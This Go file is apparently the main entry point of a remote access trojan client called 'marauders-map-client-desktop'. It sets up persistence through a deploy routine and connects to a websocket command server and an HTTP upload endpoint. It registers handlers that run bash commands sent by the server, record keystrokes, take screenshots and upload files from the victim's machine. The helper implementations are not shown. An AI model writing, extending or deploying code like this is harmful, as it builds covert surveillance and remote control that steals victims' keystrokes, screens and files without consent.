package main

import (
	"marauders-map-client-desktop/internal"
)

func main() {

	// Deploy for persistence
	// this setups home directory folder for the program
	// folder strcuture & persist mechanism
	watchtower := internal.Deploy()

	// ===========================================================================
	// Start connection and communication with server
	// Subject with Observers is passed as parameter
	// for processing commands
	// ===========================================================================
	// Creates WSClient configurations
	wscconf := internal.NewWSConfiguration("ws", "localhost", "8080", "/accesspoint")
	httpconf := internal.NewHTTPConfiguration("http", "localhost", "80", "/upload")

	// Creates WSClient
	wsc := internal.NewWSClient(wscconf, httpconf)

	// Initialize Observer for processing incoming
	// commands from server
	screenrecorder := internal.NewScreenRecorder(5)
	sendFileCmd := internal.NewSendFileCommand(wsc)

	subject := &internal.Subject{}
	subject.AddListener(internal.NewBashExecutorObserver())
	subject.AddListener(internal.NewKeyloggerCmdObserver())
	subject.AddListener(internal.NewScreenshotCmdObserver(screenrecorder, sendFileCmd))
	subject.AddListener(internal.NewFileCmdObserver(sendFileCmd, watchtower))

	// Start Communications
	wsc.StartCommunications(subject)

}
